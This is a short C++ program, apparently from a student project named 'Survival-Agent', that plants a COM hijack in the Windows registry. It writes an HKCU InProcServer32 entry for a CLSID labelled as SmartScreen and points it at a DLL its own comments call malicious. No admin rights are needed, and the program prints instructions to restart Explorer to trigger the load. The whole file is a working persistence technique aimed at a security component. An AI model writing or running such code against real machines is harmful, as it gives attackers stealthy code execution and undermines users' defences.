#include <windows.h>
#include <iostream>
#include <string>

int main() {
    // 1. The specific CLSID we verified from your ProcMon logs
    const char* clsid = "{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}";
    
    // 2. The ABSOLUTE path to your hijack DLL
    // Make sure this file actually exists at this path!
    const char* dllPath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\com_hijacking.dll";
    
    // 3. Construct the Registry Path for the User Hive
    // Windows checks HKCU\Software\Classes\CLSID before HKLM
    std::string regSubKey = "Software\\Classes\\CLSID\\" + std::string(clsid) + "\\InProcServer32";
    
    HKEY hKey;
    // 4. Create the key in HKEY_CURRENT_USER (No Admin Rights Needed)
    LSTATUS status = RegCreateKeyExA(
        HKEY_CURRENT_USER, 
        regSubKey.c_str(), 
        0, 
        NULL, 
        REG_OPTION_NON_VOLATILE, 
        KEY_WRITE, 
        NULL, 
        &hKey, 
        NULL
    );

    if (status == ERROR_SUCCESS) {
        // 5. Set the (Default) value to your malicious DLL
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, (DWORD)strlen(dllPath) + 1);
        
        // 6. Set the ThreadingModel - Critical for COM to initialize the DLL
        const char* threadingModel = "Both";
        RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)threadingModel, (DWORD)strlen(threadingModel) + 1);
        
        RegCloseKey(hKey);
        
        std::cout << "[+] SUCCESS: COM Hijack planted in HKCU." << std::endl;
        std::cout << "[*] Target: SmartScreen (" << clsid << ")" << std::endl;
        std::cout << "[*] Action: Restart Explorer.exe to trigger." << std::endl;
    } else {
        std::cerr << "[!] FAILED: Could not write to Registry. Error Code: " << status << std::endl;
        if (status == 5) {
            std::cerr << "[!] Access Denied. Is an Antivirus/Defender blocking the write?" << std::endl;
        }
    }

    return 0;
}